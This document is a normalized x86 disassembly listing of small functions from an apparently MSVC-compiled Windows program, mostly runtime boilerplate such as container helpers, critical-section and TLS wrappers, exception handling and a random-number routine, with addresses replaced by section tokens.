mov edx [ ebp + 0x8 ]
lea eax [ ecx + edx * 4 ]
mov esp ebp
pop ebp
retn 0x4
sub_415620
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_401d40
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_415670
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_415c60
add esp 0x4
mov esp ebp
pop ebp
retn
sub_415690
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_416d90
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_415750
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_415c90
mov esp ebp
pop ebp
retn 0x4
sub_4157d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_415d30
mov esp ebp
pop ebp
retn
sub_415c60
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_415fb0
pop ebp
retn
sub_415c70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40cbe0
mov esp ebp
pop ebp
retn 0x4
sub_415c90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_416e90
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_415e50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
sub eax [ ecx + 0x4 ]
sar eax 0x2
mov esp ebp
pop ebp
retn
sub_415e70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
mov esp ebp
pop ebp
retn
sub_415f60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push r--data
call sub_4215f6
sub_415f71
mov esp ebp
pop ebp
retn
sub_415f80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov esp ebp
pop ebp
retn 0x8
sub_415f90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4152c0
mov esp ebp
pop ebp
retn 0x4
sub_415fb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0xaaaaaaa
mov esp ebp
pop ebp
retn
sub_416070
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4160f0
mov esp ebp
pop ebp
retn 0x4
sub_416090
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
sub eax [ ecx ]
sar eax 0x2
mov esp ebp
pop ebp
retn
sub_4160b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_416110
add esp 0x4
mov esp ebp
pop ebp
retn
sub_4160d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_416130
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_4160f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_416f20
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_416110
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push 0x0
call sub_416f60
add esp 0x8
pop ebp
retn
sub_4164c2
push 0x1
push 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_410690
mov eax r-xdata
retn
sub_416f60
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
call sub_417240
pop ebp
retn
sub_416f70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_416f90
mov esp ebp
pop ebp
retn 0x4
sub_4170f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x40 ]
mov esp ebp
pop ebp
retn
sub_417240
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_4177f0
add esp 0x4
mov esp ebp
pop ebp
retn
sub_4177f0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_417eb0
pop ebp
retn
sub_417eb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x3fffffff
mov esp ebp
pop ebp
retn
sub_4180f7
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp - 0x24 ]
call sub_418550
push 0x0
push 0x0
call sub_42569b
mov eax r-xdata
retn
sub_418250
push ebp
mov ebp esp
mov al 0x1
pop ebp
retn
sub_418260
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_418c70
pop ebp
retn
sub_4182a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_418c90
pop ebp
retn
sub_4182c0
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_418310
push ebp
mov ebp esp
xor eax eax
pop ebp
retn
sub_418880
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_40cba0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4188a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_418af0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_4188c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov esp ebp
pop ebp
retn
sub_418960
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
movss xmm0 [ eax + 0x1c ]
movss [ ebp - 0x8 ] xmm0
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_418b20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_4011b0
mov esp ebp
pop ebp
retn
sub_418c50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0xc
sub_418c70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_418e80
mov esp ebp
pop ebp
retn 0x4
sub_418c90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_418eb0
mov esp ebp
pop ebp
retn 0x4
sub_418f40
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
call sub_418f60
add esp 0x4
mov esp ebp
pop ebp
retn
sub_418f60
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_418f70
pop ebp
retn
sub_418f70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax 0x71c71c7
mov esp ebp
pop ebp
retn
sub_419060
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
push 0x0
call sub_419110
add esp 0xc
pop ebp
retn
sub_419110
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
call sub_402160
pop ebp
retn
sub_419436
sub ecx [ ecx - 0x4 ]
sub ecx 0x58
jmp sub_40cb60
sub_419441
sub ecx [ ecx - 0x4 ]
jmp sub_40cb60
sub_419449
sub ecx [ ecx - 0x4 ]
jmp sub_412160
sub_419451
sub ecx [ ecx - 0x4 ]
jmp sub_4121d0
sub_419459
sub ecx [ ecx - 0x4 ]
jmp sub_412030
sub_419461
sub ecx [ ecx - 0x4 ]
jmp sub_4120a0
sub_419a49
mov [ ebp - 0xcd19 ] 0x0
lea ecx [ ebp - 0xccdc ]
call sub_423991
mov eax r-xdata
retn
j_sub_419d9f
jmp sub_419d9f
sub_419e10
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push eax
movzx ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_41a980
add esp 0xc
pop ebp
retn
sub_419e30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41a3c0
mov esp ebp
pop ebp
retn
sub_419e50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41a2b0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a3e0
mov esp ebp
pop ebp
retn 0x4
sub_41a360
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a420
mov esp ebp
pop ebp
retn 0x4
sub_41a3c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x8
call sub_4134a0
mov ecx [ ebp - 0x4 ]
call sub_41a500
mov esp ebp
pop ebp
retn
sub_41a500
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41a650
mov ecx [ ebp - 0x4 ]
call sub_414120
mov esp ebp
pop ebp
retn
sub_41a630
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a770
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_41a650
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_41a520
mov esp ebp
pop ebp
retn
sub_41a770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a790
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
sub_41a7c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_41a7e0
mov esp ebp
pop ebp
retn
sub_41a900
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41a920
mov esp ebp
pop ebp
retn 0x4
sub_41a920
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_41a940
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_41bc10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x18
call sub_401830
mov ecx [ ebp - 0x4 ]
call sub_401830
mov esp ebp
pop ebp
retn
sub_41c080
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_424631
add esp 0x4
pop ebp
retn
sub_41c0c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] 0x0
mov esp ebp
pop ebp
retn 0x4
sub_41db79
mov [ ebp - 0x7d4e5 ] 0x0
lea ecx [ ebp - 0x7d4a8 ]
call sub_423991
mov eax r-xdata
retn
sub_41e940
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
movzx eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp - 0x4 ]
call sub_41a5b0
mov esp ebp
pop ebp
retn 0x4
sub_41eba0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_41b530
mov esp ebp
pop ebp
retn 0x4
sub_421505
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_42396e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_421520
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_42396e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42153b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_42396e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_421556
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_42396e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_421571
mov [ ecx ] r--data
jmp sub_423991
j_sub_423991
jmp sub_423991
sub_421652
push ebp
mov ebp esp
pop ebp
jmp sub_42257f
sub_421747
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
retn
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_421846
mov eax [ rw-data ]
retn
sub_42196c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ebp
retn
push [ eax + 0x24 ]
push 0x0
call sub_425ccf
pop ecx
pop ecx
sub_4219a5
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_4219ec
mov [ rw-data ] 0x1
call sub_421ea9
pop ecx
sub_421e14
push ebp
mov ebp esp
pop ebp
jmp sub_421d72
sub_421e1d
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax * 4 + r--data ]
push [ ebp + 0x8 ]
call sub_4228c4
add esp 0xc
pop ebp
retn
j_sub_42706d
jmp sub_42706d
sub_421e3f
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_421e4d
push ebp
mov ebp esp
push 0x0
push 0xfa0
push [ ebp + 0x8 ]
call sub_4275b8
add esp 0xc
pop ebp
retn
sub_421e64
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_421e72
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
j_sub_422732#2
jmp sub_422732
sub_422534
push ecx
mov [ ecx ] r--data
call sub_4299f3
pop ecx
retn
sub_422637
call sub_423668
retn
sub_4226f3
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4225fd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_422708
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push 0x19
call sub_429d22
push 0x1
push 0x0
call sub_42789c
add esp 0xc
jmp sub_4278bb
call eax
sub_422986
push esi
call sub_424117
pop ecx
retn
sub_42298e
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42a9b8
add esp 0x14
pop ebp
retn
j_sub_422732
jmp j_sub_422732#2
sub_422b72
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_422b8d
add esp 0x14
pop ebp
retn
sub_422c16
push esi
call sub_424117
pop ecx
retn
sub_422deb
push esi
call sub_424117
pop ecx
retn
sub_42314c
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_42d0b5
add esp 0xc
pop ebp
retn
sub_423266
push esi
call sub_424117
pop ecx
retn
sub_423349
push esi
call sub_424117
pop ecx
retn
sub_423351
mov ecx [ rw-data ]
or ecx 0x1
xor eax eax
cmp [ rw-data ] ecx
sete al
retn
sub_4233ff
call sub_4240a2
add eax 0x20
push eax
push 0x1
call sub_424151
pop ecx
pop ecx
retn
sub_4234f4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4234c2
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_423526
push 0x1
push 0x1
push 0x0
call sub_423671
add esp 0xc
retn
sub_423535
push 0x1
push 0x0
push 0x0
call sub_423671
add esp 0xc
retn
sub_4235d5
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_423671
add esp 0xc
pop ebp
retn
sub_42365f
push 0x8
call sub_425b56
pop ecx
retn
sub_423668
push 0x8
call sub_425cba
pop ecx
retn
sub_42378b
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_425cba
pop ecx
sub_4237a0
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_423671
add esp 0xc
pop ebp
retn
sub_4238f7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_42396e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_423912
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_42392e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_423953
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
mov eax [ eax ]
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] 0x0
mov eax ecx
pop ebp
retn 0x8
sub_423991
mov [ ecx ] r--data
jmp sub_423a32
sub_423a32
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_422732
pop ecx
sub_423a4e
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_423c7e
push esi
call sub_424117
pop ecx
retn
sub_423d7f
push esi
call sub_424117
pop ecx
retn
sub_423ecb
push esi
call sub_424117
pop ecx
retn
sub_423f2b
test eax eax
jne r-xdata
retn
push [ ebp + 0x18 ]
push esi
push ebx
push edi
call sub_423faa
sub_423f9a
test eax eax
jne r-xdata
retn
push [ ebp + 0x14 ]
push edi
push ebx
push esi
call sub_423faa
sub_423fcd
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
cmp [ eax ] 0xe06d7363
je r-xdata
call sub_42e188
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x24 ]
retn
sub_42407b
call sub_4244ef
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_422732
and [ rw-data ] 0x0
pop ecx
retn
call sub_42eba5
sub_4241f8
push esi
call sub_424117
pop ecx
retn
sub_42443d
push esi
call sub_424117
pop ecx
retn
sub_4244ef
push 0x1
call sub_42454d
pop ecx
retn
sub_424545
push esi
call sub_424117
pop ecx
retn
sub_4245f5
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_424151
pop ecx
pop ecx
retn
sub_424628
push 0x1
call sub_425cba
pop ecx
retn
sub_42473c
push esi
call sub_424117
pop ecx
retn
sub_424744
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424680
add esp 0xc
pop ebp
retn
sub_42477f
call sub_42f4f6
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
shr ecx 0x10
and ecx 0x7fff
mov eax ecx
retn
sub_4247a2
push ebp
mov ebp esp
call sub_42f4f6
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_424c9c
push ebp
mov ebp esp
push 0x8
call sub_424ca8
pop ebp
retn
sub_424d76
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_424d8e
add esp 0x10
pop ebp
retn
sub_424f43
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_430a53
pop ecx
pop ecx
retn
sub_424f57
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_423526
mov [ ebp - 0x4 ] 0xfffffffe
mov eax esi
call sub_429b15
retn
push esi
call sub_4235d5
sub_424f80
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
call sub_429d22
push 0xff
call sub_4234f4
call sub_429cc5
_start
call sub_430f16
jmp sub_424e30
sub_4256f6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_425c7c
push 0xa
call sub_425cba
pop ecx
retn
sub_425cba
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_425e9e
push 0xc
call sub_425cba
pop ecx
retn
sub_425ea7
call sub_42f4f6
mov edx eax
mov eax [ edx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x90 ]
retn
mov ecx [ rw-data ]
test [ edx + 0x70 ] ecx
jne r-xdata
call sub_42f995
sub_426094
call sub_42f4f6
mov edx eax
mov eax [ edx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0x4 ]
retn
mov ecx [ rw-data ]
test [ edx + 0x70 ] ecx
jne r-xdata
call sub_42f995
sub_4260ba
call sub_42f4f6
mov edx eax
mov eax [ edx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
add eax 0xa0
retn
mov ecx [ rw-data ]
test [ edx + 0x70 ] ecx
jne r-xdata
call sub_42f995
sub_4267e6
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4267ef
mov esp [ ebp - 0x18 ]
call sub_42e188
sub_426811
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_42396e
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42682c
mov [ ecx ] r--data
jmp sub_423991
sub_4268f1
push [ ebp - 0x14 ]
call sub_426ae5
pop ecx
retn
sub_426a2a
push 0x4
mov eax sub_43afc3
call sub_42573d
call sub_42f4f6
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_42e1bc
call sub_42e150
sub_42706d
call sub_42f4f6
xor ecx ecx
cmp [ eax + 0x90 ] ecx
setne al
retn
sub_427124
xor eax eax
inc eax
retn
sub_427128
mov esp [ ebp - 0x18 ]
call sub_42e188
sub_4272a2
xor eax eax
inc eax
retn
sub_4272a6
mov esp [ ebp - 0x18 ]
call sub_42e188
sub_427385
push [ ebp - 0x14 ]
call sub_4272b6
pop ecx
retn
sub_4273c3
call sub_42f4f6
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_42f4f6
dec [ eax + 0x90 ]
sub_427519
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_427537
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_427556
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_427863
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ SetUnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_427871
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_427886
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_42789c
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not edx
and edx eax
or edx ecx
mov [ rw-data ] edx
pop ebp
retn
sub_427a66
push ebp
mov ebp esp
call sub_427a7d
cmp [ ebp + 0x8 ] 0x0
je r-xdata
fnclex
pop ebp
retn
call sub_432bf0
sub_427a7d
mov eax sub_432164
mov [ rw-data ] eax
mov [ rw-data ] sub_432a44
mov [ rw-data ] sub_432ad3
mov [ rw-data ] sub_432b2b
mov [ rw-data ] sub_432bae
mov [ rw-data ] eax
mov [ rw-data ] sub_432185
mov [ rw-data ] sub_432aeb
mov [ rw-data ] sub_432a55
mov [ rw-data ] sub_432b3c
retn
sub_429639
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call [ rw-data ]
pop ebp
retn 0x4
sub_429800
sub esp 0xc
fst [ esp ]
call sub_432f18
call sub_42981d
add esp 0xc
retn
sub_429a5b
push 0xe
call sub_425cba
pop ecx
retn
sub_429a8a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_429b15
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_42a0b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a0c1
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_42a1f9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42a37b
push 0x1
call sub_425cba
pop ecx
retn
sub_42a6f6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_42a620
add esp 0xc
pop ebp
retn 0x4
sub_42a729
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_433ed5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_42a75b
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_42a620
add esp 0xc
pop ebp
retn 0x8
sub_42b86f
push esi
call sub_435345
pop ecx
retn
sub_42c0e0
push esi
call sub_435345
pop ecx
retn
sub_42c9ec
push esi
call sub_435345
pop ecx
retn
sub_42cb59
push edi
call sub_435345
pop ecx
retn
sub_42ced0
push 0xb
call sub_425cba
pop ecx
retn
sub_42d0b5
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42ced9
add esp 0x10
pop ebp
retn
sub_42d16e
push esi
call sub_435345
pop ecx
retn
sub_42e0c9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_42e131
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_42e150
push 0x8
push r--data
call sub_429ad0
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
call sub_42e188
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42e174
xor eax eax
inc eax
retn
sub_42e188
push 0x8
push r--data
call sub_429ad0
call sub_42f4f6
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
